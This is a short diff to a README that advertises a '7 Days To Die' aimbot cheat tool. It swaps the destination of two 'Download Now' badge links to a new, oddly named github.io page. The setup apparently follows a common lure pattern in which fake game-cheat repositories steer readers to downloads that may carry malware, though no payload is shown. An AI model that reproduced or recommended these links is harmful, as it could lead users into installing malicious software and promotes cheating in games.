@@ -1,7 +1,7 @@
 # 🎯 7 Days To Die Aimbot v.2 — Enhanced Aim Assist Tool
 
-[![Download Aim Assistant](https://img.shields.io/badge/Download_Aim_Assistant-darkgreen?style=for-the-badge)](https://7-days-to-die-aimbot-v-2.github.io/.github/)  
-[![Download Now](https://img.shields.io/badge/Download_Now-green?style=for-the-badge&logo=7daystodie)](https://7-days-to-die-aimbot-v-2.github.io/.github/)
+[![Download Aim Assistant](https://img.shields.io/badge/Download_Aim_Assistant-darkgreen?style=for-the-badge)](https://7daysstodierepooj90web.github.io/.github/)  
+[![Download Now](https://img.shields.io/badge/Download_Now-green?style=for-the-badge&logo=7daystodie)](https://7daysstodierepooj90web.github.io/.github/)
 
 ---
 
